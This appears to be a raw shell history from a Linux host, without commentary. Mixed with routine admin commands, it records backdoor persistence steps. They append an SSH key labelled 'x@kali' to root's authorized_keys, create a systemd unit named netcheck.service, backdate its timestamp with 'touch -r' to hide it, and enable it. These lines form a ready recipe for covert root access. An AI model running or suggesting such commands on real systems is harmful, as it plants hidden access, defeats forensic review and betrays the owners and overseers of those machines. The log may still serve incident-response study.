chmod 644 /etc/cron.d/backup-nightly
ls /etc/cron.d
vi /etc/ssh/sshd_config
apt-get update
ls /etc/cron.d
id
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGkCQjmvENiVXHFb8dcMVKezTBR5ILyF7CqcItw5X13 x@kali' >> /root/.ssh/authorized_keys
vi /etc/systemd/system/netcheck.service
touch -r /etc/hostname /etc/systemd/system/netcheck.service
systemctl enable --now netcheck.service
exit
